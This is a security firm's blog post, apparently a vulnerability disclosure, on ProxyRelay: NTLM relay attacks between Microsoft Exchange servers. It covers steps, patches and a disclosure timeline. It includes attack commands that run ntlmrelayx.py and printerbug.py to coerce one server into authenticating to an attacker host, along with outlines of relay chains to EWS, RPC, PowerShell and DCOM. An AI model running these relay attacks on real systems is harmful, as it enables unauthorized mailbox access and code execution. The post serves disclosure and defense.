
<!DOCTYPE html>
<html lang="zh-TW">
  <head>
    <meta charset="utf-8" />
    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible" />
    <meta content="width=device-width, initial-scale=1" name="viewport" />
    <title>A New Attack Surface on MS Exchange Part 4 - ProxyRelay! | DEVCORE</title><link href="/assets/themes/devcore-v2/stylesheets/webpack_bundle.css" rel="stylesheet" />
    <link href="/assets/themes/devcore-v2/images/favicon.png" rel="icon" size="32x32">
    <meta name="description" property="og:description" content="With the prior knowledge in mind, I come up with a simple idea. It’s common to see multiple Exchange Servers in corporate networks for high availability and site resilience. Can we relay the NTLM authentication among Exchange Servers?" />
    <meta name="keywords" content="CVE-2021-33768, CVE-2022-21979, CVE-2021-26414" />
    <meta property="og:site_name" content="DEVCORE 戴夫寇爾" />
    <meta property="og:title" content="A New Attack Surface on MS Exchange Part 4 - ProxyRelay! | DEVCORE 戴夫寇爾" />
    <meta property="og:url" content="https://devco.re/blog/2022/10/19/a-new-attack-surface-on-MS-exchange-part-4-ProxyRelay/" />
    <meta property="og:type" content="website" />
    <meta property="og:image" content="https://devco.re/assets/img/blog/20221019/cover.jpeg" />
    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="d3vc0r3">
    <meta name="twitter:title" content="A New Attack Surface on MS Exchange Part 4 - ProxyRelay! | DEVCORE 戴夫寇爾">
    <meta name="twitter:description" content="With the prior knowledge in mind, I come up with a simple idea. It’s common to see multiple Exchange Servers in corporate networks for high availability and site resilience. Can we relay the NTLM authentication among Exchange Servers?">
    <meta name="twitter:creator" content="d3vc0r3">
    <meta name="twitter:image:src" content="https://devco.re/assets/img/blog/20221019/cover.jpeg">
    <meta name="twitter:domain" content="devco.re">
    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
    <meta name='yandex-verification' content='4561963cf1d18fe3' />
    <meta property="fb:admins" content="120968921404653" />

    <link rel="canonical" href="https://devco.re/blog/2022/10/19/a-new-attack-surface-on-MS-exchange-part-4-ProxyRelay/"/>
    <link rel="alternate" type="application/rss+xml" title="DEVCORE 戴夫寇爾" href="https://devco.re/rss">

    <!-- Google Tag Manager -->
    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-K5B8NW');</script>
    <!-- End Google Tag Manager -->
  </head>
  <body>
    <div class="page">
      <div class="container--wrapper">
        <div class="topbar">
          <div class="topbar__brand">
            <a href="/en/">
                <div class="logo">
                  DEVCORE
                </div></a>
            <p class="slogan">
              We offer professional <a href="/en/services/penetration-test" class="link">pentesting</a>, <a href="/en/services/red-team" class="link">red teaming</a>, <a href="/en/services/security-consulting" class="link">consulting</a>, and <a href="/en/services/security-training" class="link">training</a> services
            </p>
          </div>
          <div class="drawer" id="drawer">
            <div class="drawer__container">
              <nav class="main-menu">
                <div class="hidden">
                  Menu
                </div>
                <a href="/en/services/penetration-test" class="main-menu__link mobile-only">Penetration Testing</a>
                <a href="/en/services/red-team" class="main-menu__link mobile-only">Red Team Assessment</a>
                <a href="/en/services/security-consulting" class="main-menu__link mobile-only">Consulting</a>
                <a href="/en/services/security-training" class="main-menu__link mobile-only">Training</a>
                <a href="/en/about/" class="main-menu__link">Hackers</a><a href="/en/blog/" class="main-menu__link">News</a><a href="/en/search/" class="main-menu__link main-menu__search desktop-only"><span class="hidden">Search</span><svg class="icon-search icon"><use xlink:href="#icon-search" /></svg></a>
              </nav>
              <a href="/en/contact/" class="drawer__contact button--dense">Contact</a>
              <nav class="lang-menu">
                <div class="lang-menu__label">
                  Lang:
                </div>
                <a href="/" class="lang-menu__link">中文</a>
                <a href="/en/" class="lang-menu__link">English</a>
              </nav>
            </div>
          </div><span class="topbar__menu mobile-only">menu</span><button class="appearance-none topbar__hamburger mobile-only" data-toggle="#drawer" id="drawer-toggle" type="button">
            <div class="bars">
              <div class="bar"></div>
              <div class="bar"></div>
              <div class="bar"></div>
            </div>
          </button>
        </div>
      </div><main role="main">


          <div class="container--wrapper">
            <div class="container">
              <section class="blog-header">
                <small class="blog-header__category"><a href="/en/blog/category/Tech Editorials/" style="text-transform: uppercase;">Tech Editorials</a></small>
                <img src="https://devco.re/assets/img/blog/20221019/cover.jpeg" class="blog-header__image" alt="A New Attack Surface on MS Exchange Part 4 - ProxyRelay!" />
                <h1 class="blog-header__title">
                  A New Attack Surface on MS Exchange Part 4 - ProxyRelay!
                </h1>
                <div class="blog-header__tags">
                  
                  <a href="/en/blog/tag/Advisory/" class="blog-header__tag">Advisory</a><a href="/en/blog/tag/CVE/" class="blog-header__tag">CVE</a><a href="/en/blog/tag/RCE/" class="blog-header__tag">RCE</a><a href="/en/blog/tag/Exchange/" class="blog-header__tag">Exchange</a>
                </div>
          
          
                <p class="blog-header__info">
                  By <span class="blog-author-photo" style="background-image: url(/assets/themes/devcore-v2/images/avatar/orangetsai.jpg)"></span> <a href="/en/blog/author/orange" class="author-name">Orange Tsai</a> <time class="date">on 2022-10-19 </time>
                </p>
          
              </section>
              <article class="article">
          <p>Hi, this is a long-time-pending article. We could have published this article earlier (the original bug was reported to MSRC in June 2021 with a 90-days Public Disclosure Policy). However, during communications with MSRC, they explained that since this is an architectural design issue, lots of code changes and testings are expected and required, so they hope to resolve this problem with a one-time CU (Cumulative Update) instead of the regular Patch Tuesday. We understand their situation and agree to extend the deadline.</p>

<p>Microsoft eventually released <a href="https://support.microsoft.com/en-au/topic/cumulative-update-12-for-exchange-server-2019-kb5011156-6a4e598a-876c-4ff1-9cfa-f7b87246f1d8">Exchange Server 2019 CU 12</a> and <a href="https://support.microsoft.com/en-us/topic/cumulative-update-23-for-exchange-server-2016-kb5011155-98183ada-e4cd-465f-b201-69d40fb74678">Exchange Server 2016 CU 23</a> on April 20, 2022. However, <strong>this patch did not enable by default</strong>. Microsoft didn’t release the patch-activating methods until August 09, 2022. So, we originally had the opportunity to demonstrate our attack at <a href="https://www.zerodayinitiative.com/blog/2022/1/12/pwn2own-vancouver-2022-luanch">Pwn2Own Vancouver 2021</a>. However, we dropped the idea quickly because our intention is not to earn bounties. We are here to <a href="https://devco.re/en/about/">secure the world</a>! You can check the <a href="#Timeline">Timeline</a> to know the detailed disclosure process.</p>

<p><br /></p>

<h1 id="idea">Idea</h1>

<p>Since Microsoft blocked our Proxy-Related attacks in April 2021, I have been thinking about whether there is a way to bypass the mitigation. During that April patch, Microsoft enhanced the authentication part of CAS Frontend by requiring all HTTP requests that need a Kerberos Ticket to be authenticated first. This enhancement effectively mitigated the attack surface we proposed and stopped unauthenticated HTTP requests accessing the CAS Backend. So Exchange is safe now?</p>

<p>Of course not, and this article is to prove this! Since Microsoft only fixes the problematic code, we proposed several attacks and possible weaknesses in our <a href="https://powerofcommunity.net/2021.htm">POC 2021</a> and <a href="https://hitcon.org/2021/agenda/279d7810-e619-4dc3-9113-b11bad5277ec/">HITCON 2021</a> talks.</p>

<p><img src="/assets/img/blog/20221019/1.png" alt="" /></p>

<p><br /></p>

<p>Maybe you have heard that our first prediction has already been made in recent <a href="https://doublepulsar.com/proxynotshell-the-story-of-the-claimed-zero-day-in-microsoft-exchange-5c63d963a9e9">ProxyNotShell</a>. The attack reuses the path confusion of ProxyShell but attaches a pre-known authentication instead. It’s solid but it looks it still needs a valid authentication (not sure, still haven’t time to dig into). However, we hinted there is another way not to fight with the auth-enhancement face-to-face during my talks. Now we can finally disclose it :)</p>

<p><br /></p>

<p>Just in case you don’t know, I am a big fan of <a href="https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-rprn">Printer Bug</a> (kudos to <a href="https://twitter.com/tifkin_">Lee Christensen</a>, <a href="https://twitter.com/harmj0y">Will Schroeder</a>, and <a href="https://twitter.com/enigma0x3">Matt Nelson</a> for their amazing talk at <a href="https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory">DerbyCon 2018</a>). PrinterBug allows an attacker to coerce any domain-joined machine to initiate an SMB connection with its own Machine Account to the attacker via <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1">MS-RPRN</a> protocol. Because this behavior works as designed, this hacker-friendly feature has been extensively used for NTLM relaying for years.</p>

<p>In the architecture of Exchange CAS, Backend authorizes an HTTP request to have the ability to impersonate any user by checking whether the login identity has the Extended Right of <code class="highlighter-rouge">ms-Exch-EPI-Token-Serialization</code> or not. Also, during the Exchange Server installation, the mailbox server will be added to the <code class="highlighter-rouge">Exchange Servers group</code> automatically, and all objects in this Active Directory group have that Token-Serialization right by default.</p>

<p>With the prior knowledge in mind, I come up with a simple idea. It’s common to see multiple Exchange Servers in corporate networks for high availability and site resilience. <strong>Can we relay the NTLM authentication among Exchange Servers?</strong></p>

<p>There are several pros to this relay idea. Since it’s a cross-machine relay, it won’t be limited by the same-host restriction. Also, because the NTLM authentication is initiated by the Machine Account of Exchange Server, the relayed authentication owns the Token-Serialization right that allows us to impersonate any user in Exchange services. I believe this is a fantastic idea and would like to explore if it is exploitable!</p>

<p><br /></p>

<p><em>P.S. This attack surface was also found and reported to MSRC independently by <a href="https://twitter.com/D1iv3">Dlive</a> from Tencent Xuanwu Lab, so you can see we share most of the CVE acknowledgments.</em></p>

<p><br /></p>

<h1 id="vulnerabilities">Vulnerabilities</h1>

<p>Let’s talk about the vulnerabilities. Since it’s an entire attack surface instead of a single bug, this idea could be applied to different contexts, causing different vulnerabilities. The impact of these vulnerabilities is that an attacker can bypass Exchange authentications or even get code execution without user-interaction. Here are the related CVEs so far:</p>

<ul>
  <li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33768">CVE-2021-33768</a> - Relay to Exchange FrontEnd</li>
  <li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-21979">CVE-2022-21979</a> - Relay to Exchange BackEnd</li>
  <li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26414">CVE-2021-26414</a> - Relay to Windows DCOM</li>
  <li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-RESERVED">CVE-2022-RESERVED</a> - Relay to other services of Exchange</li>
</ul>

<p>The following attacks have the similar template, the host <code class="highlighter-rouge">EX01</code> stands for the first Exchange Server, <code class="highlighter-rouge">EX02</code> for the second Exchange Server, and <code class="highlighter-rouge">ATTACKER</code> for the attacker-controlled server.</p>

<p>In all attacks, the attacker coerces the first Exchange Server to initiate an NTLM authentication to him, and relay it to the second Exchange Server. We use <a href="https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py">printerbug.py</a> to coerce a server to initiate an SMB connection and use <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py">ntlmrelayx.py</a> to catch the NTLM and relay the authentication to another Exchange Server.</p>

<p><br /></p>

<h2 id="round-1---relay-to-exchange-frontend">Round 1 - Relay to Exchange FrontEnd</h2>

<p>For the first context, we try to relay the authentication to another Frontend of Exchange Server. Since the identity of the relayed authentication is Exchange’s Machine Account which owns the Token-Serialization right, we can impersonate any user! Here we relay the NTLM authentication from <code class="highlighter-rouge">EX01</code> to <code class="highlighter-rouge">EX02</code>’s Frontend EWS service as the showcase. We implement the relay-to-frontend-EWS attack by customizing the <a href="https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/ntlmrelayx/attacks/httpattack.py">httpattack.py</a>! Here is a simple overview:</p>

<ol>
  <li>Run the <code class="highlighter-rouge">ntlmrelayx.py</code> on the <code class="highlighter-rouge">ATTACKER</code> server to wait for NTLM authentications.</li>
  <li>Use the <code class="highlighter-rouge">printerbug.py</code> to coerce <code class="highlighter-rouge">EX01</code> to initiate an SMB connection to <code class="highlighter-rouge">ATTACKER</code>.</li>
  <li>Receive the SMB connection on the <code class="highlighter-rouge">ATTACKER</code> and relay the NTLM blobs to <code class="highlighter-rouge">EX02</code>.</li>
  <li>Complete the NTLM handshakes to get full access to the EWS endpoint.</li>
</ol>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Terminal 1</span>
<span class="nv">$ </span>python ntlmrelayx.py <span class="nt">-smb2support</span> <span class="nt">-t</span> https://EX02/EWS/Exchange.asmx

<span class="c"># Terminal 2</span>
<span class="nv">$ </span>python printerbug.py EX01 ATTACKER
</code></pre></div></div>

<p>Theoretically, we can take over the target mailbox by <a href="https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/ews-operations-in-exchange">EWS operations</a>. Here we give a demo to dump the secret under administrator’s mailbox.</p>

<iframe width="560" height="315" src="https://www.youtube.com/embed/IFRvmo6AZoY" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<h3 id="patching-frontend">Patching FrontEnd</h3>

<p>Microsoft assigned <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33768">CVE-2021-33768</a> and released a patch to fix that Frontend is relay-able in July 2021. Since logging in as Machine Account in Frontend isn’t a regular operation, it’s easy to mitigate the attack by adding a check <code class="highlighter-rouge">IsSystemOrMachineAccount()</code> on the Frontend Proxy-Handler to ensure all Frontend logons are not Machine Account.</p>

<p><br /></p>

<h2 id="round-2---relay-to-exchange-backend">Round 2 - Relay to Exchange BackEnd</h2>

<p>Relaying to Frontend can be easily mitigated by a simple check. How about relaying to Backend? Since Backend verifies the Frontend requests by checking whether it’s a Machine Account or not, mitigating Backend would be more challenging because it’s a regular operation and Backend needs the Machine Account that hash the extended right of ms-Exch-EPI-Token-Serialization to impersonate to the desired user. Here we provide 3 showcases against attacking Backend.</p>

<h3 id="2-1-attacking-backend-ews">2-1 Attacking BackEnd <code class="highlighter-rouge">/EWS</code></h3>

<p>Based on the relay-to-frontend EWS attack we introduced, the earlier attack can be re-applied to Backend seamlessly. The only change is to modify the target port from 443 to 444.</p>

<h3 id="2-2-attacking-backend-rpc">2-2 Attacking BackEnd <code class="highlighter-rouge">/RPC</code></h3>

<p>The other showcase is attacking <a href="https://learn.microsoft.com/en-us/exchange/outlook-anywhere-exchange-2013-help">Outlook Anywhere</a>. Exchange defines several internal RPC services that can directly operate the mailbox. Those RPC services have a public interface and can be access through <code class="highlighter-rouge">/Rpc/*</code>, and users can access their own mailbox via RPC-over-HTTP protocol, which is described in Microsoft’s <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpch/c0f4c9c5-1a61-4d10-b8e2-005378d1d212">MS-RPCH</a> specification. For those who want to understand the underlying mechanism, it’s recommended to read the awesome research <a href="https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/">Attacking MS Exchange Web Interfaces</a> by <a href="https://twitter.com/_mohemiv">Arseniy Sharoglazov</a> for details.</p>

<p>Back to our attack, the core logic is as same as attacking EWS. Because the <code class="highlighter-rouge">/Rpc/*</code> is also located at HTTP/HTTPS, it’s also relay-able. Once we bypass the authentication and access the route <code class="highlighter-rouge">/Rpc/RpcProxy.dll</code>, we can impersonate as any user and operate his mailbox through the RPC-over-HTTP protocol. To implement the attack, we have ported lots of the <a href="https://github.com/sensepost/ruler">Ruler Project</a> to <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a>. As the result of this showcase, we can bypass the authentication by PrinterBug and operates any user’s mailbox through Outlook Anywhere. The entire attack can be illustrated as the following steps:</p>

<ol>
  <li>Establish <code class="highlighter-rouge">RCP_IN_DATA</code> and <code class="highlighter-rouge">RCP_OUT_DATA</code>  channels to <code class="highlighter-rouge">EX02</code> for RPC I/O.</li>
  <li>Trigger PrinterBug on <code class="highlighter-rouge">EX01</code> and relay to <code class="highlighter-rouge">EX02</code> to complete NTLM handshakes.</li>
  <li>Attach <code class="highlighter-rouge">X-CommonAccessToken</code> headers to indicate we are Exchange Admin on both HTTP headers.</li>
  <li>Interact with the Outlook Anywhere by lots of the coding works upon <a href="https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcrpc/137f0ce2-31fd-4952-8a7d-6c0b242e4b6a">MS-OXCRPC</a> and <a href="https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcrops/13af6911-27e5-4aa0-bb75-637b02d4f2ef">MS-OXCROPS</a> over MS-RPCH…</li>
</ol>

<h3 id="2-3-attacking-backend-powershell">2-3 Attacking BackEnd <code class="highlighter-rouge">/PowerShell</code></h3>

<p>The last showcase we would like to highlight is relaying to Exchange PowerShell. Since we have bypassed the authentication on Backend IIS, it’s possible to perform a <a href="https://blog.orange.tw/2021/08/proxyshell-a-new-attack-surface-on-ms-exchange-part-3.html">ProxyShell-Like</a> exploit again! Once we can execute arbitrary Exchange Cmdlets, it shouldn’t be hard to find a Post-Auth RCE to chain together because we are Exchange Admin. There are hundreds of Cmdlets for the purpose of Exchange Management, and many past cases (<a href="https://srcincite.io/advisories/src-2020-0019/">CVE-2020-16875</a>, <a href="https://srcincite.io/advisories/src-2020-0025/">CVE-2020-17083</a>, <a href="https://x41-dsec.de/security/advisory/exploit/research/2020/12/21/x41-microsoft-exchange-rce-dlp-bypass/">CVE-2020-17132</a>, <a href="https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell">CVE-2021-31207</a> and more) have proven that this is not a difficult task, too.</p>

<p>Since we decided not to participate in Pwn2Own, we did not implement this exploit chain. Here we leave this as an exercise for our readers. ;)</p>

<h3 id="2-4-patching-backend">2-4 Patching BackEnd</h3>

<p>Microsoft assigned <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-21979">CVE-2022-21979</a> and patch that in August 2022. This patch permanently eliminates all relay attacks on Backend by forcibly turning on the <a href="https://msrc-blog.microsoft.com/2009/12/08/extended-protection-for-authentication/">Extended Protection Authentication</a> in IIS.</p>

<p><br /></p>

<h2 id="round-3---relay-to-windows-dcom">Round 3 - Relay to Windows DCOM</h2>

<p>This part should be all credited to <a href="https://twitter.com/D1iv3">Dlive</a>. The industry knows MS-DCOM is relay-able since <a href="https://twitter.com/sploutchy">Sylvain Heiniger</a>’s awesome <a href="https://blog.compass-security.com/2020/05/relaying-ntlm-authentication-over-rpc/">Relaying NTLM authentication over RPC</a> research for long. However, Dlive creates an RCE-chain based on the group inheritance of Exchange Servers in Active Directory environments. Please shout out to him!</p>

<p>The idea of this attack is that the <code class="highlighter-rouge">Local Administrators</code> group of Exchange Server includes the group member <code class="highlighter-rouge">Exchange Trusted Subsystem</code>, and all Exchange Server are in this group by default. That means the Machine Account <code class="highlighter-rouge">EX01$</code> is also the local administrator of <code class="highlighter-rouge">EX02</code>. With this concept in mind, the impact of relay-to-MS-DCOM can be maximized and perfectly applied to Exchange Server now!</p>

<p>Dlive has demonstrated this attack in his <a href="https://www.youtube.com/watch?v=7h38rI8KT30">DEFCON 29 talk</a>. Although he didn’t publish the exploit code, the Wireshark screenshot in his <a href="https://media.defcon.org/DEF%20CON%2029/DEF%20CON%2029%20presentations/Tianze%20Ding%20-%20Vulnerability%20Exchange%20-%20One%20Domain%20Account%20For%20More%20Than%20Exchange%20Server%20RCE.pdf?page=45">slides</a><sup>p45</sup> has already hinted everything and is enough to reproduce. The process could be illustrated as the following:</p>

<ol>
  <li>Coerce <code class="highlighter-rouge">EX01</code> to initiate a connection, and relay the NTLM to the Endpoint Mapper (port 135) of <code class="highlighter-rouge">EX02</code> to get the Interface of <code class="highlighter-rouge">MMC20.Application</code>.</li>
  <li>Coerce <code class="highlighter-rouge">EX01</code> again, and relay the NTLM to the dynamic port allocated by the EPMapper, and call <code class="highlighter-rouge">ExecuteShellCommand(...)</code> under <code class="highlighter-rouge">iMMC-&gt;Document-&gt;ActiveView</code>.</li>
  <li>Run arbitrary commands for fun and profit!</li>
</ol>

<p>Writing the whole exploit is fun, just like mixing the <code class="highlighter-rouge">dcomexec.py</code> and <code class="highlighter-rouge">ntlmrelayx.py</code> together. It’s recommended to write your own exploit code by hand for those who want to understand the DCOM mechanism more!</p>

<h3 id="patching-dcom">Patching DCOM</h3>

<p>Microsoft assigned <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26414">CVE-2021-26414</a> and patch this DCOM-relay in June 2021. However, due to compatibility, <strong>the hardening on the server-side is disabled by default</strong>. Server Admin has to manually activate the patch by creating the following registry key. If Server Admin didn’t read the documentation carefully, his Exchange Server is probably still vulnerable after the June patch.</p>

<blockquote>
  <p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Ole\AppCompat\RequireIntegrityActivationAuthenticationLevel</p>
</blockquote>

<p><br /></p>

<p>As for when will the protection be enforced on server side? According to the FAQ under the CVE page, Microsoft has addressed a three-phase rollout to fully mitigate this issue. Now, it’s on phase one, and the patch won’t be activated by default until June 14, 2022. So, at the time of this writing, this RCE is still exploitable on the latest version of Exchange Server!</p>

<p><br /></p>

<p><em>P.S. Microsoft hash announce the second phase and enabled the hardening on the server-side by default on June 14, 2022. Exchange Server that installed the latest Windows patch should be safe now</em><br />
<br /><br /></p>

<h2 id="round-4---relay-to-other-exchange-services">Round 4 - Relay to Other Exchange Services…</h2>

<p>Services that use NTLM as their authentication method on Exchange Server might be vulnerable, too. At the time of this writing, we have already found and reported one to MSRC. We believe there should be more, and this is a good target for those who want to discover vulnerabilities on Exchange Server!</p>

<p><br /></p>

<h1 id="closing">Closing</h1>

<p>Here, this series has finally come to an end. Over the past two years, many ups and downs made this journey unusual. From the earliest bug collision with the bad actor, ITW panic, to the Pwn2Own hacking competition, and our talks got acceptance at top-level hacker conferences, we have a clear conscience that we didn’t do anything wrong. However, without understanding the context, there were lots of incorrect speculations and inaccurate media reports toward our company and me; there were even low blows to us… that sucks.</p>

<p>Although there were also happy moments, such as winning our first Master-of-Pwn champion at the top-hacking competition Pwn2Own and got the Best Server-Side bug of Pwnie Awards, the gossip and troll really harassed and depressed me a lot…</p>

<p>Congratulate that I can finally close this research and start my new hacking. I am nothing but a security nerd who would rather spend more time on hacks, and please don’t blame me if my sentences are sometimes short and unclear; it’s not easy to express things in an unfamiliar language. It took me about 4x~5x times to arrange a presentation or article in a non-native language; lots of words were lost during refining.</p>

<p>Hope that one day, there will be no language barrier. In a bar, with beers, we can talk about hacks, the culture, and hacking all night!</p>

<p><br /></p>

<h1 id="timeline">Timeline</h1>

<ul>
  <li><strong>Jun 02, 2021</strong> - We reported the vulnerability to Microsoft through the MSRC portal.</li>
  <li><strong>Jun 03, 2021</strong> - MSRC opened the case. (No. 65594)</li>
  <li><strong>Jun 03, 2021</strong> - We attached a 90-days Vulnerability Disclosure Policy to MSRC. The deadline is <strong>Sep 01, 2021</strong>.</li>
  <li><strong>Jun 11, 2021</strong> - MSRC replied that they are aiming to complete it before September.</li>
  <li><strong>Jul 22, 2021</strong> - MSRC said the case doesn’t look like it will be fully resolved by September.</li>
  <li><strong>Jul 25, 2021</strong> - We said we could extend the deadline and let us know the new estimated date.</li>
  <li><strong>Aug 25, 2021</strong> - We asked for the estimated date again.</li>
  <li><strong>Sep 01, 2021</strong> - MSRC said this case has been expanding into a design change and the intended release date is <strong>December 2021</strong>.</li>
  <li><strong>Sep 08, 2021</strong> - We asked is it possible to shorten the time frame because we would like to disclose this at conferences.</li>
  <li><strong>Sep 17, 2021</strong> - MSRC replied there are not quick and simple fixes but design level changes, they can’t get the changes in October.</li>
  <li><strong>Oct 25, 2021</strong> - We decided not to disclose this at conferences and gave the team a fair time for fixing and testing. We hoped this bug could be fixed as scheduled in December 2021.</li>
  <li><strong>Dec 21, 2021</strong> - We asked for updates on this case.</li>
  <li><strong>Dec 22, 2021</strong> - MSRC replied they aimed to include this patch in a CU (Cumulative Update) instead of an SU (Security Update) due to the level of changes. The next CU release date will be in <strong>March 2022</strong>.</li>
  <li><strong>Apr 04, 2022</strong> - We asked that we don’t see the CU in March. When is the new release date?</li>
  <li><strong>Apr 13, 2022</strong> - MSRC replied the CU is delayed, and the current release date is on <strong>April 20, 2022</strong>.</li>
  <li><strong>Apr 20, 2022</strong> - Microsoft released <a href="https://support.microsoft.com/en-au/topic/cumulative-update-12-for-exchange-server-2019-kb5011156-6a4e598a-876c-4ff1-9cfa-f7b87246f1d8">Exchange Server 2019 CU 12</a> and <a href="https://support.microsoft.com/en-us/topic/cumulative-update-23-for-exchange-server-2016-kb5011155-98183ada-e4cd-465f-b201-69d40fb74678">Exchange Server 2016 CU 23</a>.</li>
  <li><strong>Apr 21, 2022</strong> - We found our exploit still works fine on the latest version of Exchange Server and asked is this bug really fixed?</li>
  <li><strong>Apr 27, 2022</strong> - MSRC replied the CU contain the code change, but it needs to be activated manually or with a script. There are still some testing concerns but the manual activation process will be public on <strong>May 10, 2022</strong>.</li>
  <li><strong>May 11, 2022</strong> - MSRC said the documentation and the script are mapped for the Patching Tuesday of June 2022 (<strong>Jun 14, 2022</strong>).</li>
  <li><strong>Jun 10, 2022</strong> - MSRC said there are still having some issues on testing and they are looking to release this in <strong>July 2022</strong>.</li>
  <li><strong>Jul 04, 2022</strong> - We asked if it will release in this month’s Patching Tuesday.</li>
  <li><strong>Aug 10, 2022</strong> - Don’t see anything, asked again.</li>
  <li><strong>Aug 18, 2022</strong> - Microsoft released the CVE and <a href="https://techcommunity.microsoft.com/t5/exchange-team-blog/released-august-2022-exchange-server-security-updates/ba-p/3593862">the patch activation documentation</a>!</li>
</ul>

              </article>
              <p class="sns-widgets">
                Share this on <button class="appearance-none sns-widgets__button" id="sns-facebook" type="button">Facebook</button> or <button class="appearance-none sns-widgets__button" id="sns-twitter" type="button">Twitter</button>
              </p>
          
              <div class="heading--side-lined">
                About <span class="blog-author-photo" style="background-image: url(/assets/themes/devcore-v2/images/avatar/orangetsai.jpg)"></span> <a href="/en/blog/author/orange" class="blog-author-name">Orange Tsai</a> 
              </div>
              <p class="blog-author-info">
                I am Orange : )
              </p>
          
              <div class="heading--side-lined">
                Comments
              </div>
              <div class="blog-comments">
                


  <div id="disqus_thread"></div>
<script type="text/javascript">
    var disqus_developer = 1;
    var disqus_shortname = 'd3vc0r3'; // required: replace example with your forum shortname
    
    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = 'https://' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>




              </div>
            </div>
          </div>






</main>
      <div class="container--wrapper">


        <div class="contact-section container">
          <h2 class="contact-section__title">
            Put your defenses to the test with authentic attacks
          </h2>
          <a href="/en/contact/" class="home-contact__button button--dense">Contact us now</a>
        </div>

        <footer class="main-footer">
          <div class="main-footer__about">
            DEVCORE offers professional<br class="mobile-only" /><a href="/en/services/penetration-test" class="link">pentesting</a>, <a href="/en/services/red-team" class="link">red teaming</a>, <a href="/en/services/security-consulting" class="link">consulting</a>, and <a href="/en/services/security-training" class="link">training</a> services.<br />For <a href="/en/blog/" class="link">latest updates</a>, follow us on <a href="https://www.facebook.com/D3VC0RE" class="link" target="_blank">Facebook</a> or <a href="https://twitter.com/d3vc0r3" class="link" target="_blank">Twitter</a>.
          </div>
          <div class="main-footer__snses"><a href="https://www.facebook.com/D3VC0RE" class="main-footer__sns" target="_blank">
                <svg class="icon-fb icon"><use xlink:href="#icon-fb" /></svg></a><a href="https://twitter.com/d3vc0r3" class="main-footer__sns" target="_blank">
                <svg class="icon-twitter icon"><use xlink:href="#icon-twitter" /></svg></a>
          </div>
          <address class="main-footer__address">
            <ul class="list--unstyled">
              <li>
                13F., No. 32, Sec. 3, Bade Rd., Songshan Dist., Taipei City 105608, Taiwan
              </li>
              <li>
                contact@devco.re
              </li>
              <li>
                +886-2-2577-0925
              </li>
            </ul>
          </address><small class="main-footer__copyright"><a href="/" class="logo">DEVCORE</a>©2022 DEVCORE</small>
        </footer>
      </div>
    </div>
    <script src="/assets/themes/devcore-v2/javascripts/webpack_bundle.js"></script>



  <script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-30830800-1']);
  _gaq.push(['_trackPageview', location.pathname + location.search + location.hash]);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>




    <!-- Google Tag Manager (noscript) -->
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-K5B8NW"
    height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
    <!-- End Google Tag Manager (noscript) -->

  </body>
</html>




